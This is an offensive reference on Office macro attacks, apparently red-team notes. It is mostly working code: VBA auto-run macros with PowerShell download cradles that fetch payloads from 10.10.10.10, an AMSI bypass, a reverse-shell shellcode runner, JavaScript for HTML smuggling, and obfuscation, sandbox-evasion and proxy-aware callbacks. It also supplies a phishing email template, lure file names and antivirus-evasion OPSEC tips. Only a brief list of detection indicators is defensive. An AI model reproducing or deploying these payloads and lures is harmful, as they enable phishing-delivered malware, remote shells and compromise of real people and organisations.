# Office Macro Attack Reference

## ELI5: What Are Office Macro Attacks?

**The Simple Explanation:**
Imagine a Word document as a letter. Normally, it just contains text. But macros are like tiny robots hidden inside the letter that spring to life when you open it. Attackers hide malicious robots (code) that do bad things when the document opens.

**Why Do They Work?**
- People trust documents from "colleagues" or "clients"
- Macros look like normal document features
- One click on "Enable Content" = game over
- Works because Office is everywhere in business

**The Attack Chain:**
1. 🎣 **Phishing Email** → "Please review this invoice.docx"
2. 📄 **User Opens Document** → Sees "Enable Content" warning
3. ⚡ **Macros Execute** → Hidden code runs automatically
4. 💻 **Payload Delivered** → Attacker gets control
5. 🔐 **Persistence** → Malware stays even after reboot

## Understanding the Context

### Why Office?
Microsoft Office is installed on **90%+ of corporate workstations**. It's trusted software that:
- Can execute code (VBA macros)
- Has network access
- Runs with user privileges
- Bypasses many security controls
- Is expected to create/modify files

### The Psychology Behind Success
Office macro attacks exploit **human trust patterns**:
- **Authority**: "From: CEO@company.com"
- **Urgency**: "Invoice overdue - immediate review required"
- **Curiosity**: "Employee salary adjustments Q4.xlsx"
- **Fear**: "Legal notice - response required"
- **Routine**: Mimics normal business documents

### Historical Context
- **1999**: Melissa virus infected 20% of computers worldwide via Word macro
- **2014**: Macros make comeback with Dridex banking malware
- **2016**: Locky ransomware uses macros, causes $1 billion damage
- **Today**: Still in top 3 initial access techniques

## Quick Command Reference

```vba
' AutoOpen execution
Sub AutoOpen()
    MyMacro
End Sub

' Document open execution
Sub Document_Open()
    MyMacro
End Sub

' Command execution via WSH
CreateObject("Wscript.Shell").Run "cmd.exe", 0

' PowerShell execution
CreateObject("Wscript.Shell").Run "powershell.exe -nop -w hidden -c ""IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/shell.ps1')""", 0
```

## HTML Smuggling for Initial Delivery

### ELI5: HTML Smuggling
Think of HTML smuggling like sneaking a weapon past security by bringing it in pieces. Instead of sending a suspicious .exe file (which gets blocked), we send an innocent-looking HTML page that builds the dangerous file inside the browser after security checks are done.

**The Magic Trick:**
1. 📧 Email contains harmless HTML attachment
2. 🔍 Security scans it - "just HTML, looks safe!"
3. 🌐 User opens HTML in browser
4. 🔨 JavaScript assembles the malware in memory
5. 💾 Browser saves the file to disk
6. ✅ Malware bypassed all email filters!

### Basic JavaScript Smuggling
```javascript
function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}

// Base64 encoded payload
var file = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQA...'; // msfvenom payload
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'application/octet-stream'});
var fileName = 'payload.exe';

// Auto-download
if(window.navigator.msSaveBlob) {
    // IE/Edge
    window.navigator.msSaveBlob(blob, fileName);
} else {
    // Chrome/Firefox
    var a = document.createElement('a');
    document.body.appendChild(a);
    a.style = 'display: none';
    var url = window.URL.createObjectURL(blob);
    a.href = url;
    a.download = fileName;
    a.click();
    window.URL.revokeObjectURL(url);
}
```

## VBA Macro Fundamentals

### Understanding VBA Basics
**What is VBA?** Visual Basic for Applications - Microsoft's programming language built into Office. Think of it as Office's way of automating repetitive tasks, but attackers abuse it for evil.

**Key Concepts Explained:**
- **Sub**: A subroutine (chunk of code that does something)
- **AutoOpen()**: Runs automatically when document opens
- **Document_Open()**: Another auto-run trigger
- **CreateObject()**: Creates connection to Windows components
- **WScript.Shell**: Windows component that can run commands

### Basic Macro Structure
```vba
Sub AutoOpen()
    ' Executes when document opens
    MsgBox "Document opened!"
End Sub

Sub Document_Open()
    ' Alternative auto-execution
    MyMaliciousFunction
End Sub

Private Sub MyMaliciousFunction()
    Dim cmd As String
    cmd = "calc.exe"
    CreateObject("WScript.Shell").Run cmd, 0
End Sub
```

### Obfuscated Command Execution

**Why Obfuscate?**
Antivirus looks for patterns like "cmd.exe" or "powershell.exe". By breaking these strings into pieces and using confusing names, we make the code look innocent. It's like speaking in code so eavesdroppers can't understand.

**The Techniques:**
- **Character building**: 'c' + 'm' + 'd' instead of "cmd"
- **ASCII codes**: Chr(99) = 'c', Chr(109) = 'm'
- **Meaningless names**: "Apples", "Pears" instead of "Command", "Execute"
```vba
Function Pears(Beets)
    Pears = Chr(Beets)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Sub AutoOpen()
    Dim Apples As String
    Dim Water As String

    ' Build "cmd.exe" character by character
    Apples = Pears(99) & Pears(109) & Pears(100)  ' cmd
    Water = Pears(46) & Pears(101) & Pears(120) & Pears(101)  ' .exe

    ' Execute
    GetObject(Strawberries("winmgmts:")).Get("Win32_Process").Create Apples & Water, Null, Null, pid
End Sub
```

## PowerShell Integration

### Basic PowerShell Download Cradle
```vba
Sub AutoOpen()
    Dim str As String

    str = "powershell.exe -nop -w hidden -enc " & _
          "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMAAuADEAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA="

    CreateObject("WScript.Shell").Run str, 0
End Sub
```

### AMSI Bypass Before Payload
```vba
Sub AutoOpen()
    Dim AmsiBypass As String
    Dim Payload As String

    ' AMSI bypass
    AmsiBypass = "powershell -nop -c ""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"""

    ' Main payload
    Payload = "powershell -nop -w hidden -c ""IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/payload.ps1')"""

    CreateObject("WScript.Shell").Run AmsiBypass, 0
    Application.Wait (Now + TimeValue("0:00:02"))
    CreateObject("WScript.Shell").Run Payload, 0
End Sub
```

## Shellcode Execution in Word Memory

### VBA Win32 API Shellcode Runner
```vba
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, _
    ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, _
    ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, _
    ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, _
    ByRef sourceAddr As Any, ByVal length As Long) As LongPtr

Sub AutoOpen()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long

    ' msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f vbapplication -v buf
    buf = Array(252, 72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, _
                81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
```

## Proxy-Aware Payloads

### System Proxy Detection
```vba
Function GetSystemProxy() As String
    Dim objWinHttp As Object
    Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")

    objWinHttp.SetProxy 2, "", ""
    GetSystemProxy = objWinHttp.Option(1)  ' WinHttpRequestOption_Proxy
End Function

Sub AutoOpen()
    Dim ProxyServer As String
    Dim cmd As String

    ProxyServer = GetSystemProxy()

    ' Use system proxy for PowerShell
    cmd = "powershell.exe -nop -c """ & _
          "[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy('" & ProxyServer & "'); " & _
          "[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; " & _
          "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/payload.ps1')"""

    CreateObject("WScript.Shell").Run cmd, 0
End Sub
```

## Social Engineering Enhancements

### Fake Enable Content Message
```vba
Private Sub Document_Open()
    Dim response As Integer

    response = MsgBox("This document contains important updates." & vbCrLf & _
                     "Click OK to refresh content.", vbOKCancel + vbExclamation, _
                     "Security Update Required")

    If response = vbOK Then
        ExecutePayload
    End If
End Sub

Private Sub ExecutePayload()
    ' Your malicious code here
    CreateObject("WScript.Shell").Run "powershell -nop -w hidden -c ""whoami""", 0
End Sub
```

### Document Metadata Manipulation
```vba
Sub SetLegitimateMetadata()
    ActiveDocument.BuiltInDocumentProperties("Title") = "Q3 Financial Report"
    ActiveDocument.BuiltInDocumentProperties("Subject") = "Confidential"
    ActiveDocument.BuiltInDocumentProperties("Author") = "Finance Department"
    ActiveDocument.BuiltInDocumentProperties("Company") = "Target Corp"
    ActiveDocument.Save
End Sub
```

## Evasion Techniques

### Sandbox Detection
```vba
Function IsSandbox() As Boolean
    Dim detections As Integer
    detections = 0

    ' Check for small screen (VM)
    If Application.Width < 1000 Then detections = detections + 1

    ' Check for common VM usernames
    If Environ("USERNAME") = "admin" Or Environ("USERNAME") = "user" Then
        detections = detections + 1
    End If

    ' Check for low RAM (VM)
    If Environ("NUMBER_OF_PROCESSORS") < 2 Then detections = detections + 1

    If detections >= 2 Then
        IsSandbox = True
    Else
        IsSandbox = False
    End If
End Function

Sub AutoOpen()
    If Not IsSandbox() Then
        ExecutePayload
    Else
        ' Benign activity for sandbox
        MsgBox "Document loaded successfully"
    End If
End Sub
```

### Time-Based Execution
```vba
Sub AutoOpen()
    Application.OnTime Now + TimeValue("00:00:30"), "DelayedExecution"
End Sub

Sub DelayedExecution()
    ' Execute after 30 seconds (evade sandboxes)
    CreateObject("WScript.Shell").Run "cmd.exe /c whoami", 0
End Sub
```

## Delivery Methods

### Email Template
```
Subject: Q3 Financial Report - Action Required

Dear [Name],

Please review the attached Q3 financial report.
Enable content to view the embedded charts and calculations.

The document is password protected: Q3Report2024

Best regards,
Finance Team
```

### Common File Naming Conventions
- Invoice_[DATE].docm
- Report_Q[QUARTER]_[YEAR].docm
- Meeting_Notes_[DATE].docm
- Budget_Review_[YEAR].docm
- HR_Policy_Update.docm

## Troubleshooting

### Common Issues

**Issue: Macro doesn't execute**
- Solution: Ensure file is saved as .docm (macro-enabled)
- Check Trust Center settings
- Use both AutoOpen and Document_Open

**Issue: PowerShell blocked**
- Solution: Use encoded commands
- Try WMI for execution
- Use AMSI bypass first

**Issue: Network callbacks fail**
- Solution: Implement proxy detection
- Use DNS for C2
- Try HTTPS with valid certificates

## Detection/OPSEC Notes

### Defensive Indicators
- Process creation from Word.exe
- Unusual child processes (powershell.exe, cmd.exe)
- Network connections from Office applications
- VBA macro presence in documents

### OPSEC Best Practices
1. Use common document names and metadata
2. Implement sandbox evasion
3. Avoid immediate execution (use delays)
4. Encrypt/encode payloads
5. Use legitimate-looking C2 domains
6. Test against current AV before deployment

## Lab Setup Requirements

- Windows 10 with Office 2016/2019
- Macro security set to "Enable all macros" (for testing)
- Python HTTP server for payload hosting
- Metasploit/Covenant for C2
- Process monitoring tools (ProcessHacker, ProcMon)